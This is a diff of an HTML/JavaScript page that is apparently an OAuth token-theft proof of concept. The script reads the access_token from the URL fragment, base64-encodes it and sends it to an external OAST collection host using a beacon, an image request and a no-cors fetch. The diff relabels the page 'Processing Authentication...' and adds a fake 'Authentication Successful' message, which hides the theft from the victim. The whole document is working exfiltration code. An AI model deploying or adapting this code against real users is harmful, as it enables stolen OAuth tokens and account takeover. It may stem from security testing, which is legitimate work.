@@ -1,31 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head><title>Processing...</title></head>
+<head><title>Processing Authentication...</title></head>
 <body>
-    <h1>Extracting Token...</h1>
+    <h1 id="status">Extracting Token...</h1>
     <script>
         (function() {
             // 1. Capture the fragment (#access_token=...)
             var fragment = window.location.hash;
             
-            // 2. Your NEW OAST URL
-            var oastUrl = "https://d5ofuuda9dbio9v97ls0xmcjxchecoj7h.oast.pro/?token_data=" + btoa(fragment);
+            // 2. Your NEW OAST URL (using HTTPS to avoid Mixed Content blocks)
+            var oastUrl = "https://d5ot4ita9dbh3gactc0gkzwgnyfrjp4gz.oast.fun/?token_data=" + btoa(fragment);
 
             if (fragment) {
-                // METHOD A: Navigator Beacon (Bypasses most browser blocks)
+                // Method A: Beacon (The 'Tank' - works even if page closes)
                 navigator.sendBeacon(oastUrl);
 
-                // METHOD B: Image source (The classic "leak" method)
+                // Method B: Image (The 'Ghost' - bypassed most filters)
                 var img = new Image();
                 img.src = oastUrl;
 
-                // METHOD C: Fetch (Modern background request)
+                // Method C: Fetch (The 'Standard' - no-cors mode)
                 fetch(oastUrl, { mode: 'no-cors' });
 
-                console.log("Token leak triggered to: " + oastUrl);
-                document.body.innerHTML = "<h1>Success</h1><p>Check your OAST terminal for the hit.</p>";
+                console.log("Token leak triggered.");
+                
+                // Show success message after a tiny delay
+                setTimeout(function() {
+                    document.getElementById("status").innerText = "Authentication Successful";
+                    document.body.innerHTML += "<p>Check your OAST terminal for the hit.</p>";
+                }, 1000);
             } else {
-                document.body.innerHTML = "<h1>Error: No fragment detected.</h1>";
+                document.getElementById("status").innerText = "Error: No fragment found.";
             }
         })();
     </script>
